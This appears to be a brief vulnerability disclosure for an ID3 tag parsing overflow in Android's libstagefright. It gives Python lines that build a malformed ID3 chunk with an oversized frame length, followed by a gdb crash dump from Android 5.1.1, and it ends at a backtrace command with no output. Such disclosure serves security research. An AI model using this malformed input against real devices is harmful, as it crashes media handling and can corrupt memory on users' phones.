Android libstagefright ID3 tag parsing overflow.

Corrupted ID32 chunk:

s='ID3'
s+=chr(4)
s+=chr(0)
s+=chr(0) # flags
s+='\x00\x00\x00\x0d' 
s+='abcd'
s+=struct.pack('>L',0xfffffffe)
s+=struct.pack('>h',1)
s+='a'*500

Crash on Android 5.1.1 x86:

Program received signal SIGSEGV, Segmentation fault.
[Switching to Thread 2131]
0xb7207f33 in android::RefBase::decStrong(void const*) const () from /dist/android/lib/libutils.so
(gdb) x/10i $pc
=> 0xb7207f33 <_ZNK7android7RefBase9decStrongEPKv+67>:	mov    (%eax),%edx
   0xb7207f35 <_ZNK7android7RefBase9decStrongEPKv+69>:	mov    %eax,(%esp)
   0xb7207f38 <_ZNK7android7RefBase9decStrongEPKv+72>:	mov    %edi,0x4(%esp)
   0xb7207f3c <_ZNK7android7RefBase9decStrongEPKv+76>:	call   *0xc(%edx)
   0xb7207f3f <_ZNK7android7RefBase9decStrongEPKv+79>:	mov    0xc(%esi),%eax
   0xb7207f42 <_ZNK7android7RefBase9decStrongEPKv+82>:	test   $0x1,%al
   0xb7207f44 <_ZNK7android7RefBase9decStrongEPKv+84>:	
    jne    0xb7207f1a <_ZNK7android7RefBase9decStrongEPKv+42>
   0xb7207f46 <_ZNK7android7RefBase9decStrongEPKv+86>:	mov    0x0(%ebp),%eax
   0xb7207f49 <_ZNK7android7RefBase9decStrongEPKv+89>:	mov    %ebp,(%esp)
   0xb7207f4c <_ZNK7android7RefBase9decStrongEPKv+92>:	call   *0x4(%eax)
(gdb) i r eax
eax            0x0	0
(gdb) bt 4

